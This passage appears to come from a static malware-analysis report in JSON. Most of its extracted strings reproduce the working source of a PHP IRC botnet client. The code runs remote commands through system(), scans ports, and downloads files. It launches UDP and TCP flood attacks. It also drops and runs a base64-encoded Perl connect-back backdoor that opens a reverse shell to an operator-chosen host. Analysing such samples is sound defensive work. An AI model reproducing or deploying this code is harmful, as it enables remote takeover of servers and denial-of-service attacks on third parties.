            "$pbuf = trim(fgets($pipe,512));",
            "if($pbuf != NULL)",
            "$this->privmsg($this->config['chan'],\" : $pbuf\");",
            "pclose($pipe);",
            "case \"system\":",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$exec = system($command);",
            "$ret = explode(\"\\n\",$exec);",
            "for($i=0;$i<count($ret);$i++)",
            "if($ret[$i]!=NULL)",
            "$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));",
            "break;",
            "case \"pscan\": // .pscan 127.0.0.1 6667",
            "if(count($mcmd) > 2)",
            "if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))",
            "$this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2open\\2\");",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2closed\\2\");",
            "break;",
            "case \"download\":",
            "if(count($mcmd) > 2)",
            "if(!$fp = fopen($mcmd[2],\"w\"))",
            "$this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download. Permissao negada.\");",
            "else",
            "if(!$get = file($mcmd[1]))",
            "$this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download de \\2\".$mcmd[1].\"\\2\");",
            "else",
            "for($i=0;$i<=count($get);$i++)",
            "fwrite($fp,$get[$i]);",
            "$this->privmsg($this->config['chan'],\"[\\2download\\2]: Arquivo \\2\".$mcmd[1].\"\\2 baixado para \\2\".$mcmd[2].\"\\2\");",
            "fclose($fp);",
            "else { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/file /tmp/file\"); }",
            "break;",
            "case \"die\":",
            "$this->send(\"QUIT : $nick ",
            "3,1-",
            "13 JaVaHaCK ",
            "03-\");",
            "fclose($this->conn);",
            "exit;",
            "case \"logout\":",
            "$this->log_out($host);",
            "$this->privmsg($this->config['chan'],\"[\\2auth\\2]: $nick Ndang Cewok Lek Wes Mari!!!!\");",
            "break;",
            "case \"udpflood\":",
            "if(count($mcmd)>3)",
            "$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);",
            "break;",
            "case \"tcpflood\":",
            "if(count($mcmd)>5)",
            "$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]);",
            "break;",
            "break;",
            "$old_buf = $this->buf;",
            "$this->start();",
            "function send($msg)",
            "fwrite($this->conn,\"$msg\\r\\n\");",
            "function join($chan,$key=NULL)",
            "$this->send(\"JOIN $chan $key\");",
            "function privmsg($to,$msg)",
            "$this->send(\"PRIVMSG $to :$msg\");",
            "function notice($to,$msg)",
            "$this->send(\"NOTICE $to :$msg\");",
            "function is_logged_in($host)",
            "if(isset($this->users[$host]))",
            "return 1;",
            "else",
            "return 0;",
            "function log_in($host)",
            "$this->users[$host] = true;",
            "function log_out($host)",
            "unset($this->users[$host]);",
            "function set_nick()",
            "if(isset($_SERVER['SERVER_SOFTWARE']))",
            "if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"apache\"))",
            "$this->nick = \"[A]\";",
            "elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"iis\"))",
            "$this->nick = \"[B]\";",
            "elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"xitami\"))",
            "$this->nick = \"[C]\";",
            "else",
            "$this->nick = \"[D]\";",
            "else",
            "$this->nick = \"[E]\";",
            "$this->nick .= $this->config['prefix'];",
            "for($i=0;$i<$this->config['maxrand'];$i++)",
            "$this->nick .= mt_rand(0,9);",
            "$this->send(\"NICK \".$this->nick);",
            "function udpflood($host,$packetsize,$time) {",
            "$this->privmsg($this->config['chan'],\"[\\2UdpFlood Started!\\2]\");",
            "$packet = \"\";",
            "for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }",
            "$timei = time();",
            "$i = 0;",
            "while(time()-$timei < $time) {",
            "$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);",
            "fwrite($fp,$packet);",
            "fclose($fp);",
            "$i++;",
            "$env = $i * $packetsize;",
            "$env = $env / 1048576;",
            "$vel = $env / $time;",
            "$vel = round($vel);",
            "$env = round($env);",
            "$this->privmsg($this->config['chan'],\"[\\2UdpFlood Finished!\\2]: $env MB enviados / Media: $vel MB/s \");",
            "function tcpflood($host,$packets,$packetsize,$port,$delay)",
            "$this->privmsg($this->config['chan'],\"[\\2TcpFlood Started!\\2]\");",
            "$packet = \"\";",
            "for($i=0;$i<$packetsize;$i++)",
            "$packet .= chr(mt_rand(1,256));",
            "for($i=0;$i<$packets;$i++)",
            "if(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5))",
            "$this->privmsg($this->config['chan'],\"[\\2TcpFlood\\2]: Error: <$e>\");",
            "return 0;",
            "else",
            "fwrite($fp,$packet);",
            "fclose($fp);",
            "sleep($delay);",
            "$this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets pacotes para $host:$port.\");",
            "function conback($ip,$port)",
            "$this->privmsg($this->config['chan'],\"[\\2conback\\2]: tentando conectando a $ip:$port\");",
            "$dc_source = \"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==\";",
            "if (is_writable(\"/tmp\"))",
            "if (file_exists(\"/tmp/dc.pl\")) { unlink(\"/tmp/dc.pl\"); }",
            "$fp=fopen(\"/tmp/dc.pl\",\"w\");",
            "fwrite($fp,base64_decode($dc_source));",
            "passthru(\"perl /tmp/dc.pl $ip $port &\");",
            "unlink(\"/tmp/dc.pl\");",
            "else",
            "if (is_writable(\"/var/tmp\"))",
            "if (file_exists(\"/var/tmp/dc.pl\")) { unlink(\"/var/tmp/dc.pl\"); }",
            "$fp=fopen(\"/var/tmp/dc.pl\",\"w\");",
            "fwrite($fp,base64_decode($dc_source));",
            "passthru(\"perl /var/tmp/dc.pl $ip $port &\");",
            "unlink(\"/var/tmp/dc.pl\");",
            "if (is_writable(\".\"))",
            "if (file_exists(\"dc.pl\")) { unlink(\"dc.pl\"); }",
            "$fp=fopen(\"dc.pl\",\"w\");",
            "fwrite($fp,base64_decode($dc_source));",
            "passthru(\"perl dc.pl $ip $port &\");",
            "unlink(\"dc.pl\");",
            "$bot = new pBot;",
            "$bot->start();"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "127.0.0.1",
            "72.32.184.29"
        ],
        "url": [
            "http://your.host/file",
            "http://"
        ]
    },
    "time": "0:00:00.386187",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
